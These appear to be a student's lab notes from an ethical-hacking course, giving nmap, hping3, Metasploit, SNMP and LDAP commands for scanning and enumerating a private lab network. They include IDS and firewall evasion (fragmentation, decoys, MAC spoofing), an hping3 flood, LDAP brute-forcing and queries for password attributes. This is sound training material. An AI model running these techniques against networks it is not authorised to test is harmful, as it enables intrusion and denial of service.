In the IP Range fields, type the IP range as 10.10.1.0 to 10.10.1.255 and click the Preferences icon beside the IP Range menu, as shown in the screenshot.

The Preferences window appears. In the Scanning tab, under the Pinging section, select the Pinging method as Combined UDP+TCP from the drop-down list.

Now, switch to the Display tab. Under the Display in the results list section, select the Alive hosts (responding to pings) only radio button and click OK.

In the IP Range - Angry IP Scanner window, click the Start button to start scanning the IP range that you entered.

You can also use other ping sweep tools such as SolarWinds Engineer’s Toolset (https://www.solarwinds.com), NetScanTools Pro (https://www.netscantools.com), Colasoft Ping Tool (https://www.colasoft.com), Visual Ping Tester (http://www.pingtester.net), and OpUtils (https://www.manageengine.com) to discover active hosts in the target network.

Result: hosts alive: 34
	With open ports: 4
	
########
Port and service discovery
########

Windows

Install MegaPing

Select the IP Scanner option from the left pane. In the IP Scanner tab in the right-hand pane, enter the IP range in the From and To fields; in this lab, the IP range is 10.10.1.5 to 10.10.1.20; then, click Start.

MegaPing lists all IP addresses under the specified target range with their TTL value, Status (dead or alive), and statistics of the dead and alive hosts, as shown in the screenshot.

Select the Port Scanner option from the left-hand pane. In the Port Scanner tab in the right-hand pane, enter the IP address of the Windows Server 2022 (10.10.1.22) machine into the Destination Address List field and click Add.

Select the 10.10.1.22 checkbox and click the Start button to start listening to the traffic on 10.10.1.22.

########
Port Scanning with SX tool
########

ParrotOS

In the terminal window, type sx arp [Target subnet] and press Enter (here, the target subnet is 10.10.1.0/24) to scan all the IP addresses and MAC addresses associated with the connected devices in a local network).

arp: performs an ARP scan.

Type sx arp [Target subnet] --json | tee arp.cache and press Enter to create arp.cache file (here, the target subnet is 10.10.1.0/24).

--json converts a text file to the JSON format, and tee writes the data to stdin.

Before the actual scan, sx explicitly creates an ARP cache file which is a simple text file containing a JSON string on each line and has the same JSON fields as the ARP scan JSON output. The protocols such as TCP and UDP read the ARP cache file from stdin and then begin the scan.

Type cat arp.cache | sx tcp -p 1-65535 [Target IP address] and press Enter to list all the open tcp ports on the target machine (here, the target IP address is 10.10.1.11).

tcp: performs a TCP scan, -p: specifies the range of ports to be scanned (here, the range is 1-65535).

Now, let us perform UDP scan on the target machine to check if a port is open or closed.

In the terminal, type cat arp.cache | sx udp --json -p [Target Port] 10.10.1.11 and press Enter (here, the target port is 53).

udp: performs a UDP scan, -p specifies the target port.

In a UDP scan sx returns the IP address, ICMP packet type and code set to the reply packet.

The result appears, with the reply packet from the host with Destination Unreachable type (3) and Port Unreachable code (3), which indicates that the target port is closed.

Type cat arp.cache | sx udp --json -p [Target Port] 10.10.1.11 and press Enter (here, the target port is 500).

Screenshot

You can observe that sx does not return any code in the above command, which states that the target port is open.


########
Explore Various Network Scanning Techniques using Nmap
########

Windows

open Zenmap

Command field, type the command nmap -sT -v [Target IP Address] (here, the target IP address is 10.10.1.22) and click Scan.

-sT: performs the TCP connect/full open scan and -v: enables the verbose output (include all hosts and ports in the output).

The scan results appear, displaying all the open TCP ports and services running on the target machine, as shown in the screenshot.

TCP connect scan completes a three-way handshake with the target machine. In the TCP three-way handshake, the client sends a SYN packet, which the recipient acknowledges with the SYN+ACK packet. In turn, the client acknowledges the SYN+ACK packet with an ACK packet to complete the connection. Once the handshake is completed, the client sends an RST packet to end the connection.

Click the Ports/Hosts tab to gather more information on the scan results. Nmap displays the Port, Protocol, State, Service, and Version of the scan.

Click the Topology tab to view the topology of the target network that contains the provided IP address and click the Fisheye option to view the topology clearly.

In the same way, click the Host Details tab to view the details of the TCP connect scan.

Click the Scans tab to view the command used to perform TCP connect/full open scan.

Click the Services tab located in the left pane of the window. This tab displays a list of services.

You can use any of these services and their open ports to enter into the target network/host and establish a connection.

In this sub-task, we shall be performing a stealth scan/TCP half-open scan, Xmas scan, TCP Maimon scan, and ACK flag probe scan on a firewall-enabled machine (i.e., Windows Server 2022) in order to observe the result. To do this, we need to enable Windows Firewall in the Windows Server 2022 machine.

Command field of Zenmap, type the command nmap -sS -v [Target IP Address] (here, the target IP address is 10.10.1.22) and click Scan.

-sS: performs the stealth scan/TCP half-open scan and -v: enables the verbose output (include all hosts and ports in the output).

The scan results appear, displaying all open TCP ports and services running on the target machine, as shown in the screenshot.

The stealth scan involves resetting the TCP connection between the client and server abruptly before completion of three-way handshake signals, and hence leaving the connection half-open. This scanning technique can be used to bypass firewall rules, logging mechanisms, and hide under network traffic.

In the Command field of Zenmap, type the command nmap -sX -v [Target IP Address] (here, the target IP address is 10.10.1.22) and click Scan.

-sX: performs the Xmas scan and -v: enables the verbose output (include all hosts and ports in the output).

The scan results appear, displaying that the ports are either open or filtered on the target machine, which means a firewall has been configured on the target machine.

Xmas scan sends a TCP frame to a target system with FIN, URG, and PUSH flags set. If the target has opened the port, then you will receive no response from the target system. If the target has closed the port, then you will receive a target system reply with an RST.

In the Command field, type the command nmap -sM -v [Target IP Address] (here, the target IP address is 10.10.1.22) and click Scan.

-sM: performs the TCP Maimon scan and -v: enables the verbose output (include all hosts and ports in the output).

The scan results appear, displaying either the ports are open/filtered on the target machine, which means a firewall has been configured on the target machine.

In the TCP Maimon scan, a FIN/ACK probe is sent to the target; if there is no response, then the port is Open|Filtered, but if the RST packet is sent as a response, then the port is closed.


In the Command field, type the command nmap -sA -v [Target IP Address] (here, the target IP address is 10.10.1.22) and click Scan.

-sA: performs the ACK flag probe scan and -v: enables the verbose output (include all hosts and ports in the output).

The scan results appear, displaying that the ports are filtered on the target machine, as shown in the screenshot.

The ACK flag probe scan sends an ACK probe packet with a random sequence number; no response implies that the port is filtered (stateful firewall is present), and an RST response means that the port is not filtered.

In the Command field of Zenmap, type the command nmap -sU -v [Target IP Address] (here, the target IP address is 10.10.1.22) and click Scan.

-sU: performs the UDP scan and -v: enables the verbose output (include all hosts and ports in the output).

The scan results appear, displaying all open UDP ports and services running on the target machine, as shown in the screenshot.

This scan will take approximately 20 minutes to finish the scanning process and the results might differ in your lab environment.

The UDP scan uses UDP protocol instead of the TCP. There is no three-way handshake for the UDP scan. It sends UDP packets to the target host; no response means that the port is open. If the port is closed, an ICMP port unreachable message is received.

In the Command field, type the command nmap -sV [Target IP Address] (here, the target IP address is 10.10.1.22) and click Scan.

-sV: detects service versions.

The scan results appear, displaying that open ports and the version of services running on the ports, as shown in the screenshot.

Service version detection helps you to obtain information about the running services and their versions on a target system. Obtaining an accurate service version number allows you to determine which exploits the target system is vulnerable to.

########
Explore Various Network Scanning Techniques using Hping3
########

ParrotOS

Command: hping3 -A [Target IP Address] -p 80 -c 5 (here, the target machine is Windows Server 2022 [10.10.1.22]) and press Enter.

In this command, -A specifies setting the ACK flag, -p specifies the port to be scanned (here, 80), and -c specifies the packet count (here, 5).

In a result, the number of packets sent and received is equal, indicating that the respective port is open, as shown in the screenshot.

The ACK scan sends an ACK probe packet to the target host; no response means that the port is filtered. If an RST response returns, this means that the port is closed.

Command: hping3 -8 0-100 -S [Target IP Address] -V (here, the target machine is Windows Server 2022 [10.10.1.22]) and press Enter.

In this command, -8 specifies a scan mode, -p specifies the range of ports to be scanned (here, 0-100), and -V specifies the verbose mode.

The result appears, displaying the open ports along with the name of service running on each open port, as shown in the screenshot.

The SYN scan principally deals with three of the flags: SYN, ACK, and RST. You can use these three flags for gathering illegal information from servers during the enumeration process.

Command: hping3 -F -P -U [Target IP Address] -p 80 -c 5 (here, the target machine is Windows Server 2022 [10.10.1.22]) and press Enter.

In this command, -F specifies setting the FIN flag, -P specifies setting the PUSH flag, -U specifies setting the URG flag, -c specifies the packet count (here, 5), and -p specifies the port to be scanned (here, 80).

The results demonstrate that the number of packets sent and received is equal, thereby indicating that the respective port is open, as shown in the screenshot.

FIN, PUSH, and URG scan the port on the target IP address. If a port is open on the target, you will receive a response. If the port is closed, Hping will return an RST response.

Command: hping3 --scan 0-100 -S [Target IP Address] (here, the target machine is Windows Server 2022 [10.10.1.22]) and press Enter.

In this command, --scan specifies the port range to scan, 0-100 specifies the range of ports to be scanned, and -S specifies setting the SYN flag.

The result appears displaying the open ports and names of the services running on the target IP address, as shown in the screenshot.

In the TCP stealth scan, the TCP packets are sent to the target host; if a SYN+ACK response is received, it indicates that the ports are open.

Command: hping3 -1 [Target IP Address] -p 80 -c 5 to perform ICMP scan (here, the target machine is Windows Server 2022 [10.10.1.22]) and press Enter

In this command, -1 specifies ICMP ping scan, -c specifies the packet count (here, 5), and -p specifies the port to be scanned (here, 80).

The results demonstrate that hping has sent ICMP echo requests to 10.10.1.22 and received ICMP replies which determines that the host is up.

Notes:

Apart from the aforementioned port scanning and service discovery techniques, you can also use the following scanning techniques to perform a port and service discovery on a target network using Hping3.

Entire subnet scan for live host: hping3 -1 [Target Subnet] --rand-dest -I eth0

UDP scan: hping3 -2 [Target IP Address] -p 80 -c 5


########
OS Discovery
########

========
Identify the Target System’s OS with Time-to-Live (TTL) and TCP Window Sizes using Wireshark
========

Windows

Wireshark Network Analyzer main window appears; double-click the available ethernet or interface (here, Ethernet) to start the packet capture, as shown in the screenshot.

Open the Command Prompt, type ping 10.10.1.22 and press Enter.

10.10.1.22 is the IP address of the Windows Server 2022 machine.

Choose any packet of the ICMP reply from the Windows Server 2022 (10.10.1.22) to Windows 11 (10.10.1.11) machines and expand the Internet Protocol Version 4 node in the Packet Details pane.

The TTL value is recorded as 128, which means that the ICMP reply possibly came from a Windows-based machine.

In the Command Prompt window, type ping 10.10.1.9 and press Enter.

10.10.1.9 is the IP address of the Ubuntu machine.

Screenshot

Observe the packets captured by Wireshark.

Choose any packet of ICMP reply from the Ubuntu (10.10.1.9) to Windows 11 (10.10.1.11) machine and expand the Internet Protocol Version 4 node in the Packet Details pane.

The TTL value is recorded as 64, which means the ICMP reply possibly came from a Linux-based machine.

========
Perform OS Discovery using Nmap Script Engine (NSE)
========

ParrotOS

Command: nmap -A [Target IP Address] (here, the target machine is Windows Server 2022 [10.10.1.22]) and press Enter.

-A: to perform an aggressive scan.

The scan takes approximately 10 minutes to complete.

The scan results appear, displaying the open ports and running services along with their versions and target details such as OS, computer name, NetBIOS computer name, etc. under the Host script results section.

command: nmap -O [Target IP Address] (here, the target machine is Windows Server 2022 [10.10.1.22]) and press Enter.

-O: performs the OS discovery.

The scan results appear, displaying information about open ports, respective services running on the open ports, and the name of the OS running on the target system.

command: nmap --script smb-os-discovery.nse [Target IP Address] (here, the target machine is Windows Server 2022 [10.10.1.22]) and press Enter.

--script: specifies the customized script and smb-os-discovery.nse: attempts to determine the OS, computer name, domain, workgroup, and current time over the SMB protocol (ports 445 or 139).

The scan results appear, displaying the target OS, computer name, NetBIOS computer name, etc. details under the Host script results section

========
Perform OS Discovery using Unicornscan
========

ParrotOS

Command: unicornscan [Target IP Address] -Iv (here, the target machine is Windows Server 2022 [10.10.1.22]) and press Enter.

In this command, -I specifies an immediate mode and v specifies a verbose mode.

The scan results appear, displaying the open TCP ports along with the obtained TTL value of 128. As shown in the screenshot, the ttl values acquired after the scan are 128; hence, the OS is possibly Microsoft Windows (Windows 8/8.1/10/11 or Windows Server 16/19/22).

Here, the target machine is Windows Server 2022 (10.10.1.22).

Command: unicornscan [Target IP Address] -Iv (here, the target machine is Ubuntu [10.10.1.9]) and press Enter.

The scan results appear, displaying the open TCP ports along with a TTL value of 64. As shown in the screenshot, the ttl value acquired after the scan is 64; hence, the OS is possibly a Linux-based machine (Google Linux, Ubuntu, Parrot, or Kali). Using this information, attackers can formulate an attack strategy based on the OS of the target system.

########
Lab 4
########

========
Scan beyond IDS/Firewall using various Evasion Techniques
========

Windows 11

Navigate to Control Panel --> System and Security --> Windows Defender Firewall --> Turn Windows Defender Firewall on or off, enable Windows Defender Firewall and click OK

Minimize the Control Panel window, click Search icon ( search3icon.jpg) on the Desktop. Type wireshark in the search field, the Wireshark appears in the results, click Open to launch it.

Begin pcap by double-clicking the interface

ParrotOS

open mate

sudo su

cd

command: nmap -f [Target IP Address], (here, the target machine is Windows 11 [10.10.1.11]) and press Enter.

-f switch is used to split the IP packet into tiny fragment packets.

Packet fragmentation refers to the splitting of a probe packet into several smaller packets (fragments) while sending it to a network. When these packets reach a host, IDSs and firewalls behind the host generally queue all of them and process them one by one. However, since this method of processing involves greater CPU consumption as well as network resources, the configuration of most of IDSs makes it skip fragmented packets during port scans.

Although Windows Defender Firewall is turned on in the target system (here, Windows 11), you can still obtain the results displaying all open TCP ports along with the name of services running on the ports, as shown in the screenshot.

========
SOURCE PORT MANIPULATION
========
In the Parrot Terminal window, type 

nmap -g 80 [Target IP Address], (here, target IP address is 10.10.1.11) and press Enter.

In this command, you can use the -g or --source-port option to perform source port manipulation.

Source port manipulation refers to manipulating actual port numbers with common port numbers to evade IDS/firewall: this is useful when the firewall is configured to allow packets from well-known ports like HTTP, DNS, FTP, etc.

========
MTU manipulation
========

Now, type 

nmap -mtu 8 [Target IP Address] (here, target IP address is 10.10.1.11) and press Enter.

In this command, -mtu: specifies the number of Maximum Transmission Unit (MTU) (here, 8 bytes of packets).

Using MTU, smaller packets are transmitted instead of sending one complete packet at a time. This technique evades the filtering and detection mechanism enabled in the target machine.

========
Decoy technique KAGEBUNSHIN NO-JUTSU
========

Now, type 

nmap -D RND:10 [Target IP Address] (here, target IP address is 10.10.1.11) and press Enter.

In this command, -D: performs a decoy scan and RND: generates a random and non-reserved IP addresses (here, 10).

The IP address decoy technique refers to generating or manually specifying IP addresses of the decoys to evade IDS/firewall. This technique makes it difficult for the IDS/firewall to determine which IP address was actually scanning the network and which IP addresses were decoys. By using this command, Nmap automatically generates a random number of decoys for the scan and randomly positions the real IP address between the decoy IP addresses.

========
MAC address spoofing
========

In the terminal window type 

nmap -sT -Pn --spoof-mac 0 [Target IP Address] (here, target IP address is 10.10.1.11) and press Enter.

In this command --spoof-mac 0 represents randomizing the MAC address, -sT: performs the TCP connect/full open scan, -Pn is used to skip the host discovery.

MAC address spoofing technique involves spoofing a MAC address with the MAC address of a legitimate user on the network. This technique allows you to send request packets to the targeted machine/network pretending to be a legitimate host.

========
Create Custom Packets using Colasoft Packet Builder to Scan beyond the IDS/Firewall
========

Windows Server 2019

Start wireshark and begin pcap

click Search icon ( search4icon.jpg) on the Desktop. Type colasoft in the search field, the Colasoft Packet Builder 2.0 appears in the results, click Colasoft Packet Builder 2.0 to launch it.

The Colasoft Packet Builder GUI appears; click on the Adapter icon

When the Select Adapter window appears, check the Adapter settings and click OK.

To add or create a packet, click the Add icon in the Menu bar.

In the Add Packet dialog box, select the ARP Packet template, set Delta Time as 0.1 seconds, and click OK.

You can view the added packets list on the right-hand side of the window, under Packet List.

Colasoft Packet Builder allows you to edit the decoding information in the two editors, Decode Editor and Hex Editor, located in the left pane of the window.

The Decode Editor section allows you to edit the packet decoding information by double-clicking the item that you wish to decode.

Hex Editor displays the actual packet contents in raw hexadecimal value on the left and its ASCII equivalent on the right.

to send click send in the menu bar

In the Send Selected Packets window, select the Burst Mode (no delay between packets) option, and then click Start.

Now, when this ARP packet is broadcasted in the network, the active machines receive the packet, and a few start responding with an ARP reply. To evaluate which machine is responding to the ARP packet, you need to observe packets captured by the Wireshark tool.

In the Wireshark window, click on the Filter field, type arp and press Enter. The ARP packets will be displayed, as shown in the screenshot.

Here, the host machine (10.10.1.19) is broadcasting ARP packets, prompting the target machines to reply to the message.

Switch back to the Colasoft Packet Builder window, to export the packet, click Export --> Selected Packets….

Screenshot

In the Save As window, select a destination folder in the Save in field, specify File name and Save as type, and click Save.

This saved file can be used for future reference.

Attackers can use this packet builder to create fragmented packets to bypass network firewalls and IDS systems. They can also create packets and flood the victim with a very large number of packets, which could result in DoS attacks.

========
Create Custom UDP and TCP Packets using Hping3 to Scan beyond the IDS/Firewall
========

Turn on firewall for windows 11, then start pcap in wireshark

ParrotOS

mate terminal

sudo su

cd

type 

hping3 [Target IP Address] --udp --rand-source --data 500 (here, the target machine is Windows 11 [10.10.1.11]) and press Enter.

Here, --udp specifies sending the UDP packets to the target host, --rand-source enables the random source mode and --data specifies the packet body size.

In the Parrot Terminal window, first press 

Control+C and type 

hping3 -S [Target IP Address] -p 80 -c 5 (here, target IP address is 10.10.1.11), and then press Enter.

Here, -S specifies the TCP SYN request on the target machine, -p specifies assigning the port to send the traffic, and -c is the count of the packets sent to the target machine.

Switch to the Parrot Security machine and try to flood the target machine (here, Windows 11) with TCP packets.

In the Parrot Terminal window, type 

hping3 [Target IP Address] --flood (here, target IP address is 10.10.1.11) and press Enter.

--flood: performs the TCP flooding.

Once you flood traffic to the target machine, it will respond in the hping3 terminal.

########
Lab 5
########

========
Scan a Target Network using Metasploit
========

ParrotOS

In the Parrot Terminal window, type 

service postgresql start

 and hit Enter.
 
Now, type 

msfconsole

 and hit Enter to launch Metasploit.
 
 An msf command line appears. Type 
 
db_status

 and hit Enter to check if Metasploit has connected to the database successfully. If you receive the message “postgresql selected, no connection,” then the database did not connect to msf.
 
 Exit the Metasploit framework by typing exit and press Enter. Then, to initiate the database, type msfdb init, and press Enter.
 
 To restart the postgresql service, type service postgresql restart and press Enter. Now, start the Metasploit Framework again by typing 
 
msfconsole

 and pressing Enter.
 
Check the database status by typing 

db_status

 and press Enter. This time, the database should successfully connect to msf, as shown in the screenshot.
 
Type 

nmap -Pn -sS -A -oX Test 10.10.1.0/24

 and hit Enter to scan the subnet

Here, we are scanning the whole subnet 10.10.1.0/24 for active hosts.

Nmap begins scanning the subnet and displays the results. It takes approximately 5 minutes for the scan to complete.

After the scan completes, Nmap displays the number of active hosts in the target network (here, 7).

Now, type 

db_import Test

 and hit Enter to import the Nmap results from the database.
 
Type 

hosts 

and hit Enter to view the list of active hosts along with their MAC addresses, OS names, etc. as shown in the screenshot.

Type services or db_services and hit Enter to receive a list of the services running on the active hosts, as shown in the screenshot.

In addition to running Nmap, there are a variety of other port scanners that are available within the Metasploit framework to scan the target systems.

Type 

search portscan

 and hit Enter. The Metasploit port scanning modules appear,
 
 Here, we will use the auxiliary/scanner/portscan/syn module to perform an SYN scan on the target systems. To do so, type 
 
 use auxiliary/scanner/portscan/syn
 
  and press Enter.

 We will use this module to perform an SYN scan against the target IP address range (10.10.1.5-23) to look for open port 80 through the eth0 interface.

 To do so, issue the below commands:

 set INTERFACE eth0
 set PORTS 80
 set RHOSTS 10.10.1.5-23
 set THREADS 50
 
 PORTS: specifies the ports to scan (e.g., 22-25, 80, 110-900), 
 RHOSTS: specifies the target address range or CIDR identifier, and 
 THREADS: specifies the number of concurrent threads (default 1).
 
 After specifying the above values, type run, and press Enter to initiate the scan against the target IP address range.

 Similarly, you can also specify a range of ports to be scanned against the target IP address range.

 The result appears, displaying open port 80 in active hosts, as shown in the screenshot.

Now, we will perform a TCP scan for open ports on the target systems.

To load the auxiliary/scanner/portscan/tcp module, type 

use auxiliary/scanner/portscan/tcp

 and press Enter.

Type 

hosts -R

 and press Enter to automatically set this option with the discovered hosts present in our database.

OR

Type set RHOSTS [Target IP Address] and press Enter.

Here, we will perform a TCP scan for open ports on a single IP address (10.10.1.22), as scanning multiple IP addresses consumes much time.

The results appear, displaying all open TCP ports in the target IP address (10.10.1.22).

Now that we have determined the active hosts on the target network, we can further attempt to determine the OSes running on the target systems. As there are systems in our scan that have port 445 open, we will use the module scanner/smb/version to determine which version of Windows is running on a target and which Samba version is on a Linux host.

To do so, first type back, and then press Enter to revert to the msf command line. Then, type use auxiliary/scanner/smb/smb_version and press Enter.

We will use this module to run a SMB version scan against the target IP address range (10.10.1.5-23). To do so, issue the below commands:

set RHOSTS 10.10.1.5-23

set THREADS 11

Type run and press Enter to discover SMB version in the target systems.

The result appears, displaying the OS details of the target hosts.

You can further explore various modules of Metasploit such as FTP module to identify the FTP version running in the target host.

This information can further be used to perform vulnerability analysis on the open services discovered in the target hosts.

########
Enumeration
########

========
Task 1: Perform NetBIOS Enumeration using Windows Command-Line Utilities
========

Windows 11

CMD

Command: nbtstat -a [IP address of the remote machine] (in this example, the target IP address is 10.10.1.11) and press Enter.

In this command, -a displays the NetBIOS name table of a remote computer.

The result appears, displaying the NetBIOS name table of a remote computer (in this case, the WINDOWS11 machine)

Command: nbtstat -c and press Enter.

In this command, -c lists the contents of the NetBIOS name cache of the remote computer.

The result appears, displaying the contents of the NetBIOS name cache, the table of NetBIOS names, and their resolved IP addresses.

It is possible to extract this information without creating a null session (an unauthenticated session).

Command: net use and press Enter. The output displays information about the target such as connection status, shared folder/drive and network information, as shown in the screenshot.

Screenshot

Using this information, the attackers can read or write to a remote computer system, depending on the availability of shares, or even launch a DoS attack.

========
Task 2: Perform NetBIOS Enumeration using NetBIOS Enumerator
========

Windows 11

navigate to E:\CEH-Tools\CEHv12 Module 04 Enumeration\NetBIOS Enumeration Tools\NetBIOS Enumerator and double-click NetBIOS Enumerater.exe.

If the Open - File Security Warning pop-up appears, click Run.

Under IP range to scan, enter an IP range in the from and to fields and click the Scan button to initiate the scan (In this example, we are targeting the IP range 10.10.1.15-10.10.1.100).

Ensure that the IP address in to field is between 10.10.1.100 to 10.10.1.250. If the IP address is less than 10.10.1.100, the tool might crash.

NetBIOS Enumerator scans for the provided IP address range. On completion, the scan results are displayed in the left pane, as shown in the screenshot.

The Debug window section in the right pane shows the scanning range of IP addresses and displays Ready! after the scan is finished.

It takes approximately 5 minutes for the scan to finish.

Click on the expand icon (+) to the left of the 10.10.1.19 and 10.10.1.22 IP addresses in the left pane of the window. Then click on the expand icon to the left of NetBIOS Names to display NetBIOS details of the target IP address, as shown in the screenshot.

========
Task 3: Perform NetBIOS Enumeration using an NSE Script
========

ParrotOS

Command: nmap -sV -v --script nbstat.nse [Target IP Address] (in this example, the target IP address is 10.10.1.22) and press Enter.

-sV detects the service versions, -v enables the verbose output (that is, includes all hosts and ports in the output), and --script nbstat.nse performs the NetBIOS enumeration.

The scan results appear, displaying the open ports and services, along with their versions. Displayed under the Host script results section are details about the target system such as the NetBIOS name, NetBIOS user, and NetBIOS MAC address, as shown in the screenshot.

nmap -sU -p 137 --script nbstat.nse [Target IP Address] (in this case, the target IP address is 10.10.1.22) and press Enter.

-sU performs a UDP scan, -p specifies the port to be scanned, and --script nbstat.nse performs the NetBIOS enumeration.

The scan results appear, displaying the open NetBIOS port (137) and, under the Host script results section, NetBIOS details such as NetBIOS name, NetBIOS user, and NetBIOS MAC of the target system, as shown in the screenshot.

Other tools may also be used to perform NetBIOS enumeration on the target network such as Global Network Inventory (http://www.magnetosoft.com), Advanced IP Scanner (https://www.advanced-ip-scanner.com), Hyena (https://www.systemtools.com), and Nsauditor Network Security Auditor (https://www.nsauditor.com).

########
Lab 2
########

========
Perform SNMP Enumeration using snmp-check
========

ParrotOS

***Before starting SNMP enumeration, we must first discover whether the SNMP port is open. SNMP uses port 161 by default; to check whether this port is opened, we will first run Nmap port scan.

Command: nmap -sU -p 161 [Target IP address] (in this example, the target IP address is 10.10.1.22) and press Enter.

-sU performs a UDP scan and -p specifies the port to be scanned.

The results appear, displaying that port 161 is open and being used by SNMP

snmp-check [Target IP Address] (in this example, the target IP address is 10.10.1.22) and press Enter.

The result appears as shown in the screenshot. It reveals that the extracted SNMP port 161 is being used by the default “public” community string.

If the target machine does not have a valid account, no output will be displayed.

The snmp-check command enumerates the target machine, listing sensitive information such as System information and User accounts.

Scroll down to view detailed information regarding the target network under the following sections: Network information, Network interfaces, Network IP and Routing information, and TCP connections and listening ports.

Similarly, scrolling down reveals further sensitive information on Processes, Storage information, File system information, Device information, Share, etc.

========
Perform SNMP Enumeration using SoftPerfect Network Scanner
========

Windows Server 2019

Type network in the search field, the Network Scanner appears in the results, select Network Scanner to launch it.

Click on the Options menu, and select Remote SNMP… from the drop down list. The SNMP pop-up window will appear.

Click the Mark All/None button to select all the items available for SNMP scanning and close the window.

To scan your network, enter an IP range in the IPv4 From and To fields (in this example, the target IP address range is 10.10.1.5-10.10.1.23), and click the Start Scanning button.

The scan results appear, displaying the active hosts in the target IP address range

To view the properties of an individual IP address, right-click a particular IP address (in this example, 10.10.1.22) and select Properties

The Properties window appears, displaying the Shared Resources, IP Address, MAC Address, Response Time, Host Name, Uptime, and System Description of the machine corresponding to the selected IP address.

To view the shared folders, note the scanned hosts that have a + node before them. Expand the node to view all the shared folders.

In this example, we are targeting the Windows Server 2022 machine (10.10.1.22)

Right-click the selected host, and click Open Device. A drop-down list appears, containing options that allow you to connect to the remote machine over HTTP, HTTPS, FTP, and Telnet.

If the selected host is not secure enough, you may use these options to connect to the remote machines. You may also be able to perform activities such as sending a message and shutting down a computer remotely. These features are applicable only if the selected machine has a poor security configuration.

You can also use other SNMP enumeration tools such as Network Performance Monitor (https://www.solarwinds.com), OpUtils (https://www.manageengine.com), PRTG Network Monitor (https://www.paessler.com), and Engineer’s Toolset (https://www.solarwinds.com) to perform SNMP enumeration on the target network.

========
Perform SNMP Enumeration using SnmpWalk
========

ParrotOS

snmpwalk -v1 -c public [target IP] and press Enter (here, the target IP address is 10.10.1.22).

–v: specifies the SNMP version number (1 or 2c or 3) and –c: sets a community string.

The result displays all the OIDs, variables and other associated information.

snmpwalk -v2c -c public [Target IP Address] and press Enter to perform SNMPv2 enumeration on the target machine (here, the target IP address is 10.10.1.22).

–v: specifies the SNMP version (here, 2c is selected) and –c: sets a community string.

========
Perform SNMP Enumeration using Nmap
========

ParrotOS

nmap -sU -p 161 --script=snmp-sysdescr [target IP Address] and press Enter (here, the target IP address is 10.10.1.22).

-sU: specifies a UDP scan, -p: specifies the port to be scanned, and -–script: is an argument used to execute a given script (here, snmp-sysdescr).

The result appears displaying information regarding SNMP server type and operating system details

nmap -sU -p 161 --script=snmp-processes [target IP Address] and press Enter (here, the target IP address is 10.10.1.22).

-sU: specifies UDP scan, -p: specifies the port to be scanned, and -–script: is an argument used to execute a given script (here, snmp-processes).

The result appears displaying a list of all the running SNMP processes along with the associated ports on the target machine (here, Windows Server 2022),

nmap -sU -p 161 --script=snmp-win32-software [target IP Address] and press Enter (here, the target IP address is 10.10.1.22).

-sU: specifies UDP scan, -p: specifies the port to be scanned, and -–script: argument used to execute a given script (here, the script is snmp-win32-software).

The result appears displaying a list of all the applications running on the target machine (here, Windows Server 2022)

nmap -sU -p 161 --script=snmp-interfaces [target IP Address] and press Enter (here the target IP address is 10.10.1.22).

-sU specifies a UDP scan, -p specifies the port to be scanned, and -–script is an argument allows us to run a given script (here, snmp-interfaces).

The result appears displaying information about the Operating system, network interfaces, and applications that are installed on the target machine (here, Windows Server 2022)


########
Lab 3: LDAP enumeration
########

========
Perform LDAP Enumeration using Active Directory Explorer (AD Explorer)
========

Windows Server 2019

Navigate to Z:\CEHv12 Module 04 Enumeration\LDAP Enumeration Tools\Active Directory Explorer and double-click ADExplorer.exe.

The Connect to Active Directory pop-up appears; type the IP address of the target in the Connect to field (in this example, we are targeting the Windows Server 2022 machine: 10.10.1.22) and click OK.

The Active Directory Explorer displays the active directory structure in the left pane, as shown in the screenshot.

Now, expand DC=CEH, DC=com, and CN=Users by clicking “+” to explore domain user details.

========
Perform LDAP Enumeration using Python and Nmap
========

ParrotOS

nmap -sU -p 389 [Target IP address] (here, the target IP address is 10.10.1.22) and press Enter.

-sU: performs a UDP scan and -p: specifies the port to be scanned.

The results appear, displaying that the port 389 is open and being used by LDAP,

Now, we will use NSE script to perform username enumeration on the target machine Windows Server 2022 (10.10.1.22).

Type nmap -p 389 --script ldap-brute --script-args ldap.base='"cn=users,dc=CEH,dc=com"' [Target IP Address] (here, the target IP address is 10.10.1.22) and press Enter.

-p: specifies the port to be scanned, ldap-brute: to perform brute-force LDAP authentication. ldap.base: if set, the script will use it as a base for the password guessing attempts.

Nmap attempts to brute-force LDAP authentication and displays the usernames that are found, as shown in the screenshot below.

Now, we will perform manual LDAP Enumeration using Python.

Click the MATE Terminal icon at the top-left corner of the Desktop to open a Terminal window.

Type python3 and press Enter to open a python3 shell.

Type import ldap3 and press Enter to import LDAP.

Now, we will connect to the target LDAP server without credentials using python.

Type server=ldap3.Server(’[Target IP Address]’, get_info=ldap3.ALL,port=[Target Port]) and press Enter to provide the target IP address and port number (here, the target IP address is 10.10.1.22, and the port number is 389).

In the python3 shell, type connection=ldap3.Connection(server) and press Enter.

Type connection.bind() and press Enter to bind the connection. We will receive response as True which means the connection is established successfully

Type server.info and press Enter to gather information such as naming context or domain name.

After receiving the naming context, we can make more queries to the server to extract more information.

In the terminal window, type connection.search(search_base='DC=CEH,DC=com', search_filter='(&(objectclass=*))', search_scope='SUBTREE', attributes='*') and press Enter.

Type connection.entries and press Enter to retrieve all the directory objects.

In the python3 shell, type connection.search(search_base='DC=CEH,DC=com', search_filter='(&(objectclass=person))', search_scope='SUBTREE', attributes='userpassword') and press Enter. True response indicates that the query is successfully executed.

Type connection.entries and press Enter to dump the entire LDAP information.

========
Perform LDAP Enumeration using ldapsearch
========

ParrotOS

ldapsearch -h [Target IP Address] -x -s base namingcontexts and press Enter (here, the target IP address is 10.10.1.22), to gather details related to the naming contexts.

-x: specifies simple authentication, -h: specifies the host, and -s: specifies the scope.

ldapsearch -h [Target IP Address] -x -b “DC=CEH,DC=com” and press Enter (here, the target IP address is 10.10.1.22), to obtain more information about the primary domain.

-x: specifies simple authentication, -h: specifies the host, and -b: specifies the base DN for search.

ldapsearch -x -h [Target IP Address] -b "DC=CEH,DC=com" "objectclass=*" and press Enter (here, the target IP address is 10.10.1.22), to retrieve information related to all the objects in the directory tree.

-x: specifies simple authentication, -h: specifies the host, and -b: specifies the base DN for search.

########
Lab 4: NFS Enum
########

Windows Server 2019

add server role, add server for NFS feature.

Switch to ParrotOS to check for NFS

nmap -p 2049 [Target IP Address] (here the target IP address is , 10.10.1.19) and press Enter.

-p: specifies port.

The scan result appears indicating that port 2049 is opened, and the NFS service is running on it

cd SuperEnum and press Enter to navigate to the SuperEnum folder.

Type echo "10.10.1.19" >> Target.txt and press Enter to create a file having a target machine's IP address (10.10.1.19).

